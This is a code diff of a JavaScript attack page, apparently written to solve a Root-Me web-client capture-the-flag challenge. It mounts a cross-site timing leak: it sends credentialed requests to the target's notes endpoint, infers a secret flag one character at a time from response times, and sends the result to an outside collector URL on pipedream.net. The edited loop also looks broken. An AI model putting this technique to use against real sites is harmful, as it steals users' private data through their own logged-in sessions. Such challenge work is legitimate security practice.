@@ -25,41 +25,35 @@
     <script>
         fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?presence=JeSuisLa`)
         let cnt = 0
-        for (let i = 0; i < 50; i++) {
-            let alpha = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+="
-            let flag = "z"
-
-            // Start the clock
-            var start = performance.now()
-
-            // Measure how long it takes to complete the fetch requests
-            fetch(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${9372}/${flag}${alpha[i]}`, {
-                mode: 'no-cors',
-                credentials: 'include'
-            }).then(() => {
-                // When fetch finishes, calculate the difference
-                var time = performance.now() - start;
-                console.log("The request took %d ms.", time);
-                if (time >= 2000) {
-                    //fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?lettre=${alpha[i]}&temps=${time}ms`)
-                    flag = flag + alpha[i];
-
-                    if (cnt > 4) {
-                        fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?flag=${flag}`)
+        let alpha = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+="
+        let flag = "z"
+        function test() {
+            for (let i = 0; i < 50; i++) {
+                // Start the clock
+                var start = performance.now()
+                // Measure how long it takes to complete the fetch requests
+                fetch(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${9372}/${flag}${alpha[i]}`, {
+                    mode: 'no-cors',
+                    credentials: 'include'
+                }).then(() => {
+                    // When fetch finishes, calculate the difference
+                    var time = performance.now() - start;
+                    console.log("The request took %d ms.", time);
+                    if (time >= 2000) {
+                        //fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?lettre=${alpha[i]}&temps=${time}ms`)
+                        flag = flag + alpha[i];
+                        if (cnt > 4) {
+                            fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?flag=${flag}`)
+                        }
+                        cnt++;
                     }
-                }
-            });
-
-            if (i < 49) {
-                i = 0;
-                cnt++;
-                if (cnt > 7) {
-                    i = 50
-                }
-
+                });
             }
-
         }
+        while (cnt != 5) {
+            test()
+        }
+
         // const leak = async (url, id) => {
         //     return new Promise((r) => {
         //         let s = document.createElement('script')
